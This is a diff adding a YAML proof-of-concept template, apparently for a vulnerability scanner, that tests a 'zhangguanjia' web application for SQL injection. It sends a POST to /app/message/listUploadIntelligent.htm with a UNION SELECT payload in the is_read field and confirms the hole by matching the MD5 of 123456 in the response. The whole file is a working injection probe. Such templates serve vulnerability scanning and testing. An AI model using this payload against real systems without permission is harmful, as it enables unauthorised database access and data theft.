@@ -1,0 +1,20 @@
+name: poc-yaml-zhangguanjia-listUploadIntelligent-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /app/message/listUploadIntelligent.htm?token=dingtalk_token
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: person_id=1&unit_id=1&pageNo=1&is_read=-1 union select MD5(123456),2,3,4,5,6,7,8,9,10,11,12 --
+    expression: response.status == 200 && response.body.bcontains(b'e10adc3949ba59abbe56e057f20f883e')
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486326&idx=1&sn=25b1ca6857bb8d411e117ea9c7da3aa3&chksm=c267be45f510375323db22e9ec62e07e4eedb44e92eaab769cc599a8c53da62aa4cac4e537ea&token=661111678&lang=zh_CN#rd
+
